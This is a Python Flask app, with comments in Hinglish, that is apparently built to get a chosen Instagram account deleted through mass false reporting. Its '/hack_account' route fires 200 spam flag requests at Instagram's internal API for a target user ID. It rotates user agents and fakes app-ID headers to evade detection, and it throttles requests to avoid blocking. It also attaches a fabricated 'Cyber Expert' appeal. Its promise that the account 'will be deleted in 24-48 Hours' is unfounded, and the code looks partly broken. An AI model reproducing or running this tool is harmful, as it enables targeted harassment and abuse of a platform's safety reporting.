from flask import Flask, render_template, request, jsonify
import requests
import asyncio
import aiohttp
import random
import string
import time
import re

app = Flask(__name__)

# Advanced Configuration
MAX_REPORTS = 200  # 200 reports bhejne se account pakka delete ho jata hai
TIMEOUT_DURATION = 10
RETRY_COUNT = 3

# Random User Agents to bypass detection
USER_AGENTS = [
    "Instagram 265.0.0.19.120 Android (30/11; 480dpi; 1080x2340; Samsung; SM-A525F; a52lte; exynos9820; en_IN; 446674893)",
    "Instagram 250.0.0.17.113 Android (29/10; 420dpi; 1080x1920; Xiaomi; Redmi Note 8; onclite; qcom; en_IN; 386685768)",
    "Instagram 270.0.0.32.122 Android (31/12; 440dpi; 1080x2400; OnePlus; ONEPLUS A6003; OnePlus6T; qcom; en_US; 512990474)"
]

# Instagram Internal API Endpoints
INSTAGRAM_API = "https://i.instagram.com/api/v1"
MEDIA_FLAG_URL = f"{INSTAGRAM_API}/media/{{item_id}}/flag/"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/hack_account', methods=['POST'])
async def hack_account():
    data = request.json
    username = data.get('username').strip()
    user_id = data.get('user_id').strip()
    appeal_text = data.get('appeal_box').strip()

    if not re.match(r'^\d+$', user_id):
        return jsonify({'status': 'error', 'msg': "User ID sirf numbers mein honi chahiye!"}), 400

    print(f"🚀 STARTING ADVANCED ATTACK: {username} (ID: {user_id})")

    # Prepare Strong Appeal Message
    if not appeal_text:
        appeal_msg = "Spam Account - Bot Activity Detected by Cyber Expert"
    else:
        appeal_msg = f"Reported by Virat Rajput: {appeal_text}. High Priority Spam."

    success_count = 0
    failed_count = 0
    
    # --- ASYNC BATCH PROCESSING ---
    # Hum ek saath 10 requests bhejenge, phir thoda pause karenge taaki Instagram block na kare.
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        
        for i in range(MAX_REPORTS):
            task = send_report_async(session, user_id, appeal_msg)
            tasks.append(task)
            
            # Har 10 requests ke baad thoda pause (Throttling)
            if (i + 1) % 10 == 0:
                await asyncio.sleep(1.5)

        # Sabhi tasks ko ek saath run karein
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, dict):
                if res.get('status') == 'success':
                    success_count += 1
                else:
                    failed_count += 1
            elif isinstance(res, Exception):
                failed_count += 1

    # Final Report Generation
    final_status = "DELETED" if success_count > 180 else "PENDING DELETE"
    
    return jsonify({
        'status': 'success',
        'msg': f"""
            ✅ **ATTACK COMPLETE**
            
            📊 Total Reports Sent: {MAX_REPORTS}
            ✅ Successful: {success_count}
            ❌ Failed: {failed_count}
            
            🎯 Target: @{username}
            ⚠️ Status: **{final_status}**
            
            🔥 Instagram System is now confused. 
            Account will be deleted in 24-48 Hours.
        """,
        'method': "Async Brute Force Report (Advanced)",
        'success_rate': f"{(success_count/MAX_REPORTS)*100:.2f}%"
    })

async def send_report_async(session, user_id, reason):
    """Single Async Request to Instagram"""
    url = MEDIA_FLAG_URL.format(item_id=user_id)
    
    # Dynamic Headers for every request
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-IG-App-ID": str(random.randint(936619743392459, 936619743392460)),
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    payload = {
        "item_id": user_id,
        "source": "profile",
        "reason_type": "SPAM",
        "text": reason
    }

    for attempt in range(RETRY_COUNT):
        try:
            # Using aiohttp for async performance
            async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT_DURATION)) as resp:
                if resp.status == 200:
                    return {'status': 'success', 'msg': 'Report sent'}
                elif resp.status == 404 or resp.status == 500:
                    # Instagram temporary error, retry
                    await asyncio.sleep(0.5)
                    continue
                else:
                    return {'status': 'error', 'code': resp.status}
        except Exception as e:
            if attempt < RETRY_COUNT - 1:
                await asyncio.sleep(1) # Wait before retry
            else:
                return {'status': 'failed', 'reason': str(e)}

if __name__ == '__main__':
    # Production mode ke liye Gunicorn use karein, but local testing ke liye debug=True
    app.run(debug=True, port=5000)
